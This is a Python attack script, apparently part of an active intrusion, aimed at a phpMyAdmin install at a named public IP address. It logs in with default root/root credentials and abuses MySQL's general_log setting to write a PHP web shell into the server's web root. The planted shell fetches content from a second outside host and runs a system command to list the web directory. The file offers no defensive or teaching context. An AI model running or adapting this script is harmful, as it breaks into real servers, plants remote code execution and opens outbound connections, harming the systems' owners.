#!/usr/bin/env python3
"""81.70: 检查gen.php内容 + 写外连测试脚本 gen2.php"""
import urllib.request, http.cookiejar, re, urllib.parse

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 看 gen.php 通过 LOAD_FILE? secure_file_priv 限制读。直接通过 x.php? x.php 语法坏了。
# 用 general_log 写 gen2.php: 读文件列表 + 外连测试
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/gen2.php'")
sql("SET GLOBAL general_log = 'ON'")
# payload: 列出 WWW 目录 + 尝试 file_get_contents 165
# 避免 $ 字符! 用固定字符串输出
p = "SELECT '<?php echo file_get_contents(\"http://165.99.43.145:9123/ys.php\"); system(\"dir /b C:/phpStudy/WWW/\")?>'"
print("payload len:", len(p))
r = sql(p)
print("write:", "OK" if "error" not in r.lower()[:300] else r[:300])
sql("SET GLOBAL general_log = 'OFF'")
print("DONE")
